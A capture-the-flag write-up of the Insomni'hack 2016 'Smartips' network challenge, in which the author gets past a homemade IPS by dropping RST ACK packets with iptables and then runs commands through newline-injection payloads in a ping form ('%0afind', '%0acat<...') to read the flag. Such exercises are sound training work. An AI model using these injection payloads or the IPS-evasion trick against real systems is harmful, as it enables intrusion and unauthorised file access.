#Insomni'hack CTF 2016 : Smartips

**Category:** Network **Level:** easy

> Description : Our smartcat was not so secure so we decided to add a powerful homemade smart IPS. No chance for you to have a flag now! :-)

##Write-up

We got a debugging web interface for this 'homemade IPS' which allow to do a ping from the server behind the IPS. Quickly, I understood that the IPS was filtering the IP input for the ping with a white list wich accept only numbers, letters and points. When an input have the right chars but a wrong or not accessible IP, we got :

```
Error running ping -c 1 11.11.11.11
```

This error is similare to a challenge from the teaser : [insomnihack-ctf-teaser-smartcat1-writeup](https://highon.coffee/blog/insomnihack-ctf-teaser-smartcat1-writeup/)

We were banging our head on the wall trying every kind of character class to evade the IPS and getting rejected mercilessly everytime. At that point, calling for reinforcements and re-reading the challenge description, we got suggestion from Beuc to attempt some packet filtering. After some analyse with wrong input that killed the connection "catched by the IPS", we saw that when we receive a 'RST ACK', the IPS continue to communicate even with the 'RST ACK'!

![alt tag](https://github.com/hexpresso/WU-2016/blob/master/insomnihack-ctf-2016/network/Smartips/smartips_capture.png)

So the idea was to drop 'RST ACK' packets to continue to communicate with the server and then to bypass the homemade IPS rules.

```
iptables -A INPUT -p TCP --tcp-flags ALL RST,ACK -s 10.13.39.30 -j DROP
```

Then, I tried to insert the same command than is the teaser writeup `dest=192.168.5.105%0afind`

Bingo !

```
PING 192.168.5.105 (192.168.5.105) 56(84) bytes of data.
64 bytes from 192.168.5.105: icmp_seq=1 ttl=63 time=0.437 ms
--- 192.168.5.105 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.437/0.437/0.437/0.000 ms
.
./img
./img/cat.jpg
./.htaccess
./this
./this/smart
./this/smart/ips
./this/smart/ips/is
...
./this/smart/ips/is/not/so/smart/so/you/can/find/the/flag/here/flag
./index.py
```

Then `dest=192.168.5.105%0acat<./this/smart/ips/is/not/so/smart/so/you/can/find/the/flag/here/flag`

**Flag:** INS{$hitty_IPS_i$_n0t_so_U$eful}

[zbetcheckin](https://twitter.com/zbetcheckin)
